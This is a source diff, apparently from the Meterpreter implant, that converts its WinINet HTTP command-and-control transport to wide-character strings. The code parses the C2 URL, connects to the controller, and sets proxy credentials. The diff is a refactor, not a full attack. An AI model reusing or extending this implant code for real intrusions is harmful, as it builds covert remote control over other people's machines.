@@ -3,6 +3,9 @@
 
 #ifndef USE_WINHTTP
 
+#define HOSTNAME_LEN 512
+#define URLPATH_LEN 1024
+
 DWORD server_dispatch_http_wininet(Remote * remote, THREAD* serverThread, int iExpirationTimeout, int iCommTimeout,
 	wchar_t* pMetUA, wchar_t* pMetProxy, wchar_t* pMetProxyUser, wchar_t* pMetProxyPass)
 {
@@ -13,8 +16,8 @@ DWORD server_dispatch_http_wininet(Remote * remote, THREAD* serverThread, int iE
 	URL_COMPONENTS bits;
 	DWORD ecount = 0;
 	DWORD delay = 0;
-	char tmpHostName[512];
-	char tmpUrlPath[1024];
+	wchar_t tmpHostName[HOSTNAME_LEN];
+	wchar_t tmpUrlPath[URLPATH_LEN];
 
 	remote->expiration_time = 0;
 	if (iExpirationTimeout > 0)
@@ -27,7 +30,7 @@ DWORD server_dispatch_http_wininet(Remote * remote, THREAD* serverThread, int iE
 	remote->comm_last_packet = current_unix_timestamp();
 
 	// Allocate the top-level handle
-	if (!strcmp(pMetProxy, "METERPRETER_PROXY"))
+	if (!wcscmp(pMetProxy, L"METERPRETER_PROXY"))
 	{
 		remote->hInternet = InternetOpen(pMetUA, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
 	}
@@ -45,22 +48,22 @@ DWORD server_dispatch_http_wininet(Remote * remote, THREAD* serverThread, int iE
 	dprintf("[DISPATCH] Configured hInternet: 0x%.8x", remote->hInternet);
 
 	// The InternetCrackUrl method was poorly designed...
-	memset(tmpHostName, 0, sizeof(tmpHostName));
-	memset(tmpUrlPath, 0, sizeof(tmpUrlPath));
+	ZeroMemory(tmpHostName, sizeof(tmpHostName));
+	ZeroMemory(tmpUrlPath, sizeof(tmpUrlPath));
+	ZeroMemory(&bits, sizeof(bits));
 
-	memset(&bits, 0, sizeof(bits));
 	bits.dwStructSize = sizeof(bits);
-	bits.dwHostNameLength = sizeof(tmpHostName)-1;
+	bits.dwHostNameLength = HOSTNAME_LEN - 1;
 	bits.lpszHostName = tmpHostName;
-	bits.dwUrlPathLength = sizeof(tmpUrlPath)-1;
+	bits.dwUrlPathLength = URLPATH_LEN - 1;
 	bits.lpszUrlPath = tmpUrlPath;
 
 	InternetCrackUrl(remote->url, 0, 0, &bits);
 
-	remote->uri = _strdup(tmpUrlPath);
+	remote->uri = _wcsdup(tmpUrlPath);
 
-	dprintf("[DISPATCH] Configured URL: %s", remote->uri);
-	dprintf("[DISPATCH] Host: %s Port: %u", tmpHostName, bits.nPort);
+	dprintf("[DISPATCH] Configured URL: %S", remote->uri);
+	dprintf("[DISPATCH] Host: %S Port: %u", tmpHostName, bits.nPort);
 
 	// Allocate the connection handle
 	remote->hConnection = InternetConnect(remote->hInternet, tmpHostName, bits.nPort, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
@@ -73,11 +76,11 @@ DWORD server_dispatch_http_wininet(Remote * remote, THREAD* serverThread, int iE
 	dprintf("[DISPATCH] Configured hConnection: 0x%.8x", remote->hConnection);
 
 	//authentication
-	if (!(strcmp(pMetProxyUser, "METERPRETER_USERNAME_PROXY") == 0))
+	if (!(wcscmp(pMetProxyUser, L"METERPRETER_USERNAME_PROXY") == 0))
 	{
-		InternetSetOption(remote->hConnection, INTERNET_OPTION_PROXY_USERNAME, pMetProxyUser, (DWORD)strlen(pMetProxyUser) + 1);
-		InternetSetOption(remote->hConnection, INTERNET_OPTION_PROXY_PASSWORD, pMetProxyPass, (DWORD)strlen(pMetProxyPass) + 1);
-		dprintf("[DISPATCH] Proxy authentication configured : %s/%s", pMetProxyUser, pMetProxyPass);
+		InternetSetOption(remote->hConnection, INTERNET_OPTION_PROXY_USERNAME, pMetProxyUser, (DWORD)wcslen(pMetProxyUser) + 1);
+		InternetSetOption(remote->hConnection, INTERNET_OPTION_PROXY_PASSWORD, pMetProxyPass, (DWORD)wcslen(pMetProxyPass) + 1);
+		dprintf("[DISPATCH] Proxy authentication configured : %S/%S", pMetProxyUser, pMetProxyPass);
 	}
 
 	// Bring up the scheduler subsystem.
